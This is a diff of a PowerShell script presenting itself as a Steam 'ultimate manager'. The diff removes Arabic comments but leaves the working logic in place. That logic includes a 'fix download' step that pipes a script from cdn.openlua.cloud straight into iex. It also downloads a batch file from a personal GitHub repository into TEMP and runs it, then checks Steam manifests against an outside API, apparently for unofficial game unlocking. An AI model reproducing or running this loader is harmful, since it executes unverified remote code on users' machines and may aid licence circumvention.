@@ -1,18 +1,14 @@
 [Console]::InputEncoding = [System.Text.Encoding]::UTF8
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 
-# --- إعدادات الهوية الخاصة بك (SEIF AFANDI) ---
 $MyToolName = "SEIF AFANDI - STEAM ULTIMATE MANAGER"
 $MyVersion = "v3.5"
 $Author = "SEIF AFANDI"
 $API = "https://api.steamproof.net"
 
-# روابط الملفات الخاصة بسيف
 $batUrl = "https://raw.githubusercontent.com/857seif/11111111/main/game.bat"
 $batPath = Join-Path $env:TEMP "game_seif.bat"
 $fixCommand = "irm -useb cdn.openlua.cloud/fix-download.ps1 | iex"
-
-# ----------------------------------------------
 
 function Show-SpinnerAndResult {
     param (
@@ -60,7 +56,6 @@ function Show-SpinnerAndResult {
     return $result
 }
 
-# --- واجهة البداية ---
 Clear-Host
 Write-Host ""
 Write-Host "  ===================================================" -ForegroundColor Cyan
@@ -69,7 +64,6 @@ Write-Host "  BY: $Author - POWERED BY SEIF ENGINE" -ForegroundColor Gray
 Write-Host "  ===================================================" -ForegroundColor Cyan
 Write-Host ""
 
-# --- الخطوة 1: تشغيل أمر إصلاح التحميل (Fix Download) ---
 Show-SpinnerAndResult `
     -SpinnerText "جاري تهيئة إعدادات التحميل (Fix Download)..." `
     -Action {
@@ -81,7 +75,6 @@ Show-SpinnerAndResult `
         }
     } | Out-Null
 
-# --- الخطوة 2: تحميل وتشغيل ملف SEIF AFANDI الخارجي ---
 $seifTask = Show-SpinnerAndResult `
     -SpinnerText "جاري جلب ملفات النظام من سيف أفندي..." `
     -Action {
@@ -105,7 +98,6 @@ if ($seifTask.Success -and (Test-Path $batPath)) {
 }
 Write-Host "  ---------------------------------------------------" -ForegroundColor Gray
 
-# --- الخطوة 3: فحص Steam والـ Manifests ---
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
 $steamResult = Show-SpinnerAndResult `
@@ -136,10 +128,9 @@ if ($steamResult.Success) {
     }
 }
 
-# --- الخاتمة ---
 Write-Host ""
 Write-Host "  ***************************************************" -ForegroundColor Cyan
-Write-Host "  اكتملت جميع العمليات! شكراً لك يا سيف أفندي." -ForegroundColor Black -BackgroundColor Green
+Write-Host "  اكتملت جميع العمليات!  ." -ForegroundColor Black -BackgroundColor Green
 Write-Host "  ***************************************************" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "اضغط أي مفتاح لإغلاق السكربت..." -ForegroundColor Gray
